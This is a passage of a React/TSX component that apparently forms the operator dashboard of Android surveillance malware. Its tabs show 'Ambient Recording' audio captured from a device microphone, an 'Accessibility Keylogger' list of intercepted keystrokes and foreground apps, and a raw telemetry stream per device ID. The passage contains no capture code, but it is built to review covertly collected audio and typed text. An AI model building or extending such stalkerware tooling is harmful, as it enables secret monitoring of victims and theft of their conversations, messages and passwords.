                  </div>
                )}

                {/* 6. MIC & AUDIO MEMOS */}
                {recordedTab === "mic" && (
                  <div className="space-y-4">
                    <h3 className="text-xs font-black uppercase text-amber-700 tracking-wider flex items-center gap-2">
                      <Mic size={16} /> Recorded Voice Memos & Ambient Audio ({filteredRecordedLogs.length})
                    </h3>
                    <div className="space-y-3">
                      {filteredRecordedLogs.map((log: any, idx: number) => {
                        const audioUrl = log.cloudinary_url || log.audio_url;
                        return (
                          <div key={idx} className="p-4 bg-slate-50 border border-slate-200 rounded-2xl flex items-center justify-between gap-4">
                            <div className="space-y-1">
                              <p className="text-xs font-bold text-slate-800">Ambient Recording</p>
                              <p className="text-[10px] text-slate-400">{log.timestamp}</p>
                            </div>
                            {audioUrl ? (
                              <audio controls src={audioUrl} className="h-9 w-64" />
                            ) : (
                              <span className="text-xs text-amber-700 font-bold bg-amber-50 px-3 py-1 rounded-lg">
                                Processed
                              </span>
                            )}
                          </div>
                        );
                      })}
                    </div>
                  </div>
                )}

                {/* 7. ACCESSIBILITY KEYLOGGER */}
                {recordedTab === "keylogger" && (
                  <div className="space-y-4">
                    <h3 className="text-xs font-black uppercase text-slate-700 tracking-wider flex items-center gap-2">
                      <Terminal size={16} /> Intercepted Keystrokes & Foreground Apps ({filteredRecordedLogs.length})
                    </h3>
                    <div className="divide-y divide-slate-100 border border-slate-200 rounded-2xl overflow-hidden bg-white">
                      {filteredRecordedLogs.map((log: any, idx: number) => (
                        <div key={idx} className="p-4 space-y-1 hover:bg-slate-50 transition-colors">
                          <div className="flex items-center justify-between text-xs">
                            <span className="font-mono font-bold text-blue-700 bg-blue-50 px-2 py-0.5 rounded">
                              {log.package || "Android App"}
                            </span>
                            <span className="text-[10px] text-slate-400">{log.timestamp}</span>
                          </div>
                          <p className="text-xs font-mono text-slate-800 font-semibold bg-slate-50 p-2.5 rounded-xl border border-slate-100">
                            {log.captured_text || JSON.stringify(log)}
                          </p>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {/* 8. ALL TELEMETRY LOGS */}
                {recordedTab === "all" && (
                  <div className="space-y-4">
                    <h3 className="text-xs font-black uppercase text-slate-700 tracking-wider flex items-center gap-2">
                      <Database size={16} /> Full Telemetry Logs Stream ({filteredRecordedLogs.length})
                    </h3>
                    <div className="space-y-3">
                      {filteredRecordedLogs.map((log: any, idx: number) => (
                        <div key={idx} className="p-3 bg-slate-950 text-emerald-400 font-mono text-xs rounded-2xl border border-slate-800">
                          <div className="flex items-center justify-between text-slate-500 text-[10px] mb-1">
                            <span>#{idx + 1} — Device: {log.device_id || "Unknown"}</span>
                            <span>{log.timestamp}</span>
                          </div>
                          <pre className="overflow-x-auto">{JSON.stringify(log, null, 2)}</pre>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
}
